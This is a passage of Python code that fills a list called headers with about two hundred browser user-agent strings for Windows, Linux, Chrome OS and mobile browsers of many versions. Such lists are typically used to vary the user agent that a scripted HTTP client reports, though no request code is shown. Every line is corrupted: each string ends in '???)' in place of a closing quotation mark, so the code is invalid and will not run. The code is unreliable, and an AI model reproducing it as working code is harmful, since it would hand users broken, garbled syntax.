    headers.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 OPR/48.0.2685.52???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.99???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36 OPR/63.0.3368.107???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36 OPR/33.0.1990.115???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.1144???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko???)
    headers.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7???)
    headers.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3???)
    headers.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6???)
    headers.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0???)
    headers.append("Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/53.0.2907.99???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 OPR/56.0.3051.52???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36 OPR/63.0.3368.107???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 OPR/78.0.4093.214???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.50???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 OPR/80.0.4170.63???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.43???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.62???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.2.14???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 YaBrowser/19.9.3.314 Yowser/2.5 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko???)
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058???)
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536???)
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586???)
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254???)
    headers.append("Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527 (KHTML, like Gecko, Safari/419.3) Arora/0.8.0???)
    headers.append("Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)???)
    headers.append("Mozilla/5.0 (Windows; U; Win98; de-DE; rv:1.7.12)???)
    headers.append("Mozilla/5.0 (Windows; U; Win98; de; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)???)
    headers.append("Mozilla/5.0 (Windows; U; Win 9x 4.90; de; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:1.7.5)???)
    headers.append("Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:1.7.12)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007???)
    headers.append("Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:0.9.4.1) Gecko/20020508???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:0.9.4.1) Gecko/20020508 Netscape6/6.2.3???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.6)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.8)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.10)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.12)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; de; rv:1.8) Gecko/20051111 Firefox/1.5???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; de; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.2)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0,gzip(gfe) (via translate.google.com)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; zh-TW; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.7.3)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.7.12)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.4) Gecko/20030619 Netscape/7.1 (ax)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.6) Gecko/20050321 Firefox/1.0.2???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.7)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.8)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.10)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.12) Gecko/20050919 Firefox/1.0.7???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8) Gecko/20051111 Firefox/1.5???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.7.6)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.5) Gecko/20031007 Firebird/0.7???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.2)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8a3)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.6)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.7.10)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; fi; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR; rv:1.7.12)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; sl; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; de; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527 (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)???)
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27???)
    headers.append("Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a???)
    headers.append("Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2???)
    headers.append("Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0???)
    headers.append("Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1???)
    headers.append("Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36???)
    headers.append("Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0???)
    headers.append("Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1???)
    headers.append("Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1???)
    headers.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34???)
    headers.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1???)
    headers.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2???)
    headers.append("Mozilla/5.0 (X11; Linux i686; rv:1.7.5)???)
    headers.append("Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1???)
    headers.append("Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre???)
    headers.append("Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0???)
    headers.append("Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0???)
    headers.append("Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2???)
    headers.append("Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0???)
    headers.append("Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1???)
    headers.append("Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/77.0.3865.90 Chrome/77.0.3865.90 Safari/537.36???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1???)
